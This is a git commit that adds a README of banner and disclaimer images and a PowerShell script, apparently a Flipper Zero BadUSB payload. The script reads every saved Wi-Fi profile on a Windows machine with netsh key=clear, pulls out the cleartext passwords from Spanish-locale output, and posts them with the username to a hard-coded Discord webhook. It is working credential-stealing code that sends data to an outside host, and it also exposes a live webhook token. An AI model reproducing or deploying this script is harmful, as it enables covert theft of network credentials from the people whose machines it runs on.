11327c5d4e2fb865263bb7c580e34a398e6bfae1
Isaac Sanz <isaacsanzgomez102125@gmail.com>
2023-10-22 21:55:45 +0200

    Update

---
+++ README.md
@@ -0,0 +1,6 @@
+<div align=center>
+
+<img src="https://github.com/aleff-github/my-flipper-shits/blob/main/img/logo-repository-2_0.gif" width="600" /><br>
+<img src="https://raw.githubusercontent.com/Zenin0/Glitter_Scripts/main/main/img/DISCLAIMER.png?token=GHSAT0AAAAAACJCV62VALXFXVMURW4QNGGOZJVRPVQ" width="600" />
+
+</div>
---
+++ Windows/W-Wifi-Passwords/W-Wifi-Passwords.ps1
@@ -0,0 +1,33 @@
+# Get the first 10 Wi-Fi profiles
+$wifiProfiles = netsh wlan show profiles | Select-Object
+
+# Define the webhook URL
+$webhook_url = "https://discord.com/api/webhooks/1164596165849927792/7ASILUXC1ya92O9OsNFDXhVS_MBFOkTZWlBLVaTtzVwXeO8jz1_IGi5w82goz88vProJ"
+$content = '```'
+
+$wifiProfiles | ForEach-Object {
+    $profileName = $_ | Select-String 'Perfil de todos los usuarios\s+:\s(.+)' | ForEach-Object {
+        $_.Matches.Groups[1].Value
+    }
+    $wifiProfileDetails = netsh wlan show profile name="$profileName" key=clear
+
+    $wifiPassword = $wifiProfileDetails | Select-String 'Contenido de la clave\s+:\s(.+)' | ForEach-Object {
+        $_.Matches.Groups[1].Value
+    }
+
+    $username = $env:username + " | " + $profileName
+
+    if ($wifiPassword) {
+        $content += "Wi-Fi password $profileName : $wifiPassword`n"  # Use `n for a newline
+    }
+
+}
+
+$content += '```'
+
+$message_data = @{
+    'username' = $username + "Flipper"
+    'content'  = $content
+}
+
+Invoke-WebRequest -Uri $webhook_url -Method Post -ContentType "application/json" -Body ($message_data | ConvertTo-Json)
